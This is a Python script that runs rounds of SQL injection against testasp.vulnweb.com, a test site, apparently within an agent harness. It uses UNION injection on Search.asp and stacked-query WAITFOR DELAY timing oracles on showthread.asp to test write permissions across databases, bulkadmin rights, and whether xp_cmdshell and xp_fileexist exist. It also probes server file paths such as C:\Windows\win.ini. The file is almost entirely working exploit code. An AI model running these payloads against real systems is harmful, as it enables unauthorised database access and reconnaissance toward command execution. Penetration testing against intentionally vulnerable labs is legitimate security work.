#!/usr/bin/env python3
"""Round 11 — 교차 DB 쓰기 권한 오라클 + 잔여 확인 (전부 읽기 전용, 쓰기 없음)."""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r11"
EVI = f"{J}/evidence/r11"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)


def run(url, body_out=None, timeout=90):
    b = body_out or f"{SCR}/_b.tmp"
    cmd = ["curl", "-s", "-S"] + PROXY + ["-m", str(timeout), "-D", f"{SCR}/_h.tmp", "-o", b,
                                          "-w", "%{http_code} %{time_total}", url]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return (r.stdout or "").strip() or "ERR " + (r.stderr or "").strip()[:100], b


def union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    _, b = run(f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe=""), f"{SCR}/U_{tag}.html")
    body = open(b, "rb").read().decode("latin-1")
    open(f"{EVI}/r11_union_{tag}.html", "w", encoding="latin-1").write(body)
    i = body.find("posted by")
    v = body[i + 9:body.find("</b>", i)].strip() if i >= 0 else "?"
    print(f"  [{tag:34}] {v!r}")
    return v


def delay_oracle(cond, label):
    """stacked + IF 지연 오라클 (showthread 은 쿼리 2회 실행 → 2배 지연)"""
    p = f"0;IF {cond} WAITFOR DELAY '0:0:04'--"
    info, _ = run(f"{BASE}/showthread.asp?id=" + urllib.parse.quote(p, safe=""))
    code, tt = info.split()[0], float(info.split()[1])
    verdict = "TRUE" if tt > 4 else "false"
    print(f"  [{label:44}] {tt:6.2f}s  → {verdict}")
    return verdict


print("=" * 74)
print("A. 교차 DB 권한 오라클 (권한 확인만 — 실제 쓰기 없음)")
print("=" * 74)
for cond, label in [
    ("(SELECT IS_MEMBER('db_datawriter'))=1", "acuforum db_datawriter(대조군)"),
    ("(SELECT HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','INSERT'))=1",
     "acuforum.dbo.users INSERT"),
    ("(SELECT HAS_PERMS_BY_NAME('acublog.dbo.users','OBJECT','UPDATE'))=1",
     "acublog.dbo.users UPDATE"),
    ("(SELECT HAS_PERMS_BY_NAME('acublog.dbo.comments','OBJECT','INSERT'))=1",
     "acublog.dbo.comments INSERT"),
    ("(SELECT HAS_PERMS_BY_NAME('acuservice.dbo.users','OBJECT','SELECT'))=1",
     "acuservice.dbo.users SELECT"),
    ("(SELECT HAS_PERMS_BY_NAME('acuservice.dbo.users','OBJECT','UPDATE'))=1",
     "acuservice.dbo.users UPDATE"),
    ("(SELECT HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','ALTER'))=1",
     "acuforum.dbo.users ALTER(DDL)"),
    ("(SELECT HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','CONTROL'))=1",
     "acuforum.dbo.users CONTROL"),
]:
    delay_oracle(cond, label)

print()
print("=" * 74)
print("B. 파일시스템/OS 경로 도달성 (읽기 전용 오라클)")
print("=" * 74)
for cond, label in [
    ("(SELECT IS_SRVROLEMEMBER('bulkadmin'))=1", "bulkadmin(OPENROWSET/BULK 가능성)"),
    ("(SELECT HAS_PERMS_BY_NAME(NULL,NULL,'ADMINISTER BULK OPERATIONS'))=1", "BULK OPERATIONS 권한"),
    ("(SELECT object_id('xp_cmdshell') IS NOT NULL)", "xp_cmdshell 프로시저 존재"),
    ("(SELECT object_id('master.dbo.xp_dirtree') IS NOT NULL)", "xp_dirtree 존재(파일/경로 오라클)"),
    ("(SELECT object_id('master.dbo.xp_fileexist') IS NOT NULL)", "xp_fileexist 존재"),
]:
    delay_oracle(cond, label)

print()
print("C. xp_fileexist 지연 오라클 — 서버 파일시스템 도달성(읽기 전용)")
for path, label in [
    ("C:\\Windows\\win.ini", "C:\\Windows\\win.ini (존재해야 정상)"),
    ("C:\\scripts\\logInput.txt", "C:\\scripts\\logInput.txt (traversal 로는 500 이었음)"),
    ("C:\\inetpub\\wwwroot", "C:\\inetpub\\wwwroot (디렉터리)"),
    ("C:\\nope\\nope.txt", "C:\\nope\\nope.txt (대조군: 없음)"),
]:
    p_ = (f"0;DECLARE @e int; EXEC master.dbo.xp_fileexist '{path}', @e OUTPUT; "
          f"IF @e=1 WAITFOR DELAY '0:0:04'--")
    info, _ = run(f"{BASE}/showthread.asp?id=" + urllib.parse.quote(p_, safe=""))
    parts = info.split()
    tt = float(parts[1]) if len(parts) > 1 else -1
    print(f"  [{label:46}] {info.split()[0]} {tt:6.2f}s → {'존재' if tt > 4 else '없음/판정불가'}")

print()
print("D. 잔여 확인 — Round 10 에서 만든 파일/행 정리 상태")
for u in ["/r10probe.txt", "/r10probe.asp"]:
    info, _ = run(f"{BASE}{u}")
    print(f"  GET {u:18} → {info}  (404 = 생성되지 않았음/삭제됨)")
union("1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(10)),"
      "CAST((SELECT COUNT(*) FROM posts) AS nvarchar(10)),"
      "CAST((SELECT COUNT(*) FROM users WHERE uname IN ('acu-r7 proof','acu-r9-reg')) AS nvarchar(10)),"
      "1,1,GETDATE(),'A','TT','FN'", "footprint_counts")
print()
print("done")
